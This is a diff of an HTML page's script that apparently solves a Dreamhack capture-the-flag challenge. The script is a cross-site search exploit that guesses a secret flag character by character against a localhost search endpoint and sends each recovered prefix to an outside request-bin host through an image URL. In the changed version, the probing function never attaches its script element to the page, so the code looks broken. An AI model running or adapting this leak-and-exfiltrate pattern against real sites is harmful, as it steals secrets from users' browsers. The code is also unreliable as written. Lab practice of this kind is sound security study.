@@ -3,42 +3,38 @@
 <script>
     async function req(url) {
         return await new Promise((resolve, reject) => {
-            const listItems = document.querySelectorAll('li'); // 리스트 아이템들을 선택
-            for (const listItem of listItems) {
-                const markerStyle = window.getComputedStyle(listItem, '::marker'); // ::marker 스타일 가져오기
-            if (markerStyle.content !== '')
-                    return resolve();
-                else
-                    return reject();
-            }
-        })
+            let script = document.createElement('script');
+            script.src = url;
+            script.onload = () => { 
+                return resolve();
+            };
+            script.onerror = () => {
+                return reject();
+            };
+        });
     }
-
     async function search(query) {
         try {
             await req(
-                `http://localhost:8000/search?keyword=${query}`
+              `http://localhost:8000/search?keyword=${query}`
             );
             return true;
         } catch (e) {
             return false;
         }
     }
-
     async function exploit() {
-        let chars = "0123456789abcdef}";
+        let chars = "0123456789abcdef"
         let secret = "DH{";
-
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://nfqajgm.request.dreamhack.games/${secret}`;
+                    img.src = `https://fyxkybj.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
         }
     }
-    
     exploit();
 </script>
